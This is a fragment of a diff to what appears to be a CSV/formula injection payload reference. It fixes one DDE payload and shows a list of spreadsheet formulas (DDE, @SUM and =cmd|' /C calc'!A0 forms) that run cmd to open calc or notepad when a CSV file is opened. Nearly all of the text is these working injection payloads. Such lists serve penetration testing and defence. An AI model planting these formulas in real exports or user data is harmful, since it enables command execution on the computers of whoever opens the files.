@@ -7,7 +7,7 @@ CSV Injection, also known as Formula Injection, occurs when websites embed untru
 #### Payloads :
 
 ```
-DDE ("cmd";"/C calc";"!A0")A0
+=DDE("cmd";"/C calc";"!A0")A0
 @SUM(1+9)*cmd|' /C calc'!A0
 =10+20+cmd|' /C calc'!A0
 =cmd|' /C notepad'!'A1'
